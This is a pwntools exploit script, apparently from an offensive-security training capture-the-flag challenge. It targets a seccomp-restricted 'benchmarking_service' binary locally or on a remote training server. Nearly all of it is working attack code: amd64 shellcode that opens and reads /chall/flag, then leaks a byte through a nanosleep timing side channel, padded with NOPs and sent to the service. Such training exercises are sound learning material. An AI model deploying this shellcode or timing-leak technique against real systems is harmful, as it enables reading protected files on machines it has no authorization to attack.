from pwn import *
import time
import random
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    p = process("./benchmarking_service")
    gdb.attach(p, """
        b* 0x0040138f
        
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 5001)

#PYTHONUNBUFFERED=1 python wrapper.py

open_file = """
mov rax, 0x2      
xor rsi, rsi
xor rdx, rdx
mov rcx, 0x662f6c6c6168632f  #/chall/f
mov rbx, 0x67616c            #lag
push rbx
push rcx
mov rdi, rsp           #ad rdi associo il pathname ./flag
syscall
"""

asm_read = """
mov rsi, rdi          #inizializzo buffer con un indirizzo
mov rdi, rax          # associo il fd contenuto in RAX in rdi
mov rax, 0x0
mov rdx, 0x30
syscall
"""

#sleep

payload="""
mov al, [rsi+40]
mov dl,0x7d
cmp al,dl 
jne then
xor rax,rax
xor rsi,rsi
xor rdi,rdi
mov rax, 0x23
mov rsi,0
mov rbx, 4
push rbx
mov rbx, 4
push rbx
mov rdi, rsp
syscall 
then: 
"""

a=asm(open_file)+asm(asm_read)+asm(payload)
p.send(a.ljust(1024,b"\x90"))


p.interactive()


#seccomp-tools dump ./benchmarking_service